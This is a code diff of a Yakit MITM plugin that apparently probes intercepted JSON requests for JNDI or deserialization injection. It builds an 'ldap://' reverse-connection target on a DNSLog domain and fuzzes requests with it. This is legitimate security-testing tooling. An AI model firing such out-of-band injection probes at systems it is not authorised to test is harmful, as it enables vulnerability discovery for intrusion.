@@ -2,7 +2,7 @@
 
 #--------------------------WORKSPACE-----------------------------
 __test__ = func() {
-    results, err := yakit.GenerateYakitMITMHooksParams("GET", "http://192.168.101.211:26468/")
+    results, err := yakit.GenerateYakitMITMHooksParams("GET", "http://192.168.101.177:8084/")
     if err != nil {
         
         return
@@ -39,6 +39,7 @@ subTask = func() {
 }
 
 mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
+    
     addTask()
     defer subTask()
     defer func {
@@ -52,15 +53,16 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
     addr = str.HostPort(host, port)
 
     rspIns, err = poc.ParseBytesToHTTPResponse(rsp)
+    reqIns, err = poc.ParseBytesToHTTPRequest(req)
     if err != nil {
         println(err)
         return
     }
 
 
-    result = str.Join(rspIns.Header["Content-Type"], "; ")
-    if (!str.MatchAllOfSubString(str.ToLower(result), "json")) && (!str.IsJsonResponse(rspIns)) {
-        log.info("not a valid json type: %v", result)
+    rsqContentType = str.Join(rspIns.Header["Content-Type"], "; ")
+    reqContentType = str.Join(reqIns.Header["Content-Type"], "; ")
+    if (!str.MatchAllOfSubString(str.ToLower(rsqContentType), "json")) && (!str.IsJsonResponse(rspIns)) && !str.MatchAllOfSubString(str.ToLower(reqContentType), "json"){
         return
     }
 
@@ -71,14 +73,14 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
     yakit_output("Start to fetch DNSLog")
     domain, token, err = risk.NewDNSLogDomain()// "ldap://127.0.0.1:123/123"
     if err != nil {
-        yakit_output("Fetch DNSLog Failed: %s", err)
+        yakit_output(sprintf("Fetch DNSLog Failed: %s", err))
         return
     }
     yakit_output(sprintf("Fetch domain: %s",domain))
     reverseConnTarget = sprintf("ldap://%v/%v", domain, str.RandStr(10))
     freq, err = fuzz.HTTPRequest(req)
     if err != nil {
-        yakit_output("build http request failed: %s", err)
+        yakit_output(sprintf("build http request failed: %s", err))
         return
     }
 
